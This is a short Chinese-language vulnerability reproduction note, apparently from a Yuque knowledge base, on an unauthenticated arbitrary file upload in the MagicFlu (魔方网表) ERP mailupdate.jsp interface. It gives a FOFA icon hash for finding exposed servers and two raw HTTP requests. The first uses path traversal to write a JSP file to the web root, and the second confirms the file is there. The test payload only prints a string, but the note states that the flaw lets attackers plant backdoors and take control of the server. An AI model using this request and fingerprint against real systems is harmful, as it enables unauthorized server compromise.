# 魔方网表mailupdate接口存在任意文件上传漏洞

# 一、漏洞简介
魔方网表是一款基于web浏览器的通用信息管理软件，魔方网表ERP 存在任意文件上传漏洞，未经身份验证的攻击者可以利用此漏洞上传恶意后门文件 ，控制服务器权限

# 二、影响版本
+ 魔方网表

# 三、资产测绘
+ fofa`<font style="color:rgb(63, 63, 63);">icon_hash="694014318"</font>`
+ <font style="color:rgb(63, 63, 63);">特征</font>

![1713198631042-1ecb3376-f689-4f92-a0fc-8722c6de5d26.png](./img/fcGeBck8qqEaERf7/1713198631042-1ecb3376-f689-4f92-a0fc-8722c6de5d26-935968.png)

# 四、漏洞复现
```java
GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
```

![1713198660976-8be544e1-30c0-4c5d-82c6-ce893cd8d981.png](./img/fcGeBck8qqEaERf7/1713198660976-8be544e1-30c0-4c5d-82c6-ce893cd8d981-189341.png)

文件上传位置

```java
GET /magicflu/test1.jsp HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
```

![1713198689517-129760d5-4911-439f-9c06-03e28e38c489.png](./img/fcGeBck8qqEaERf7/1713198689517-129760d5-4911-439f-9c06-03e28e38c489-361593.png)



> 更新: 2024-04-17 14:59:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lb3k53eifkairogb>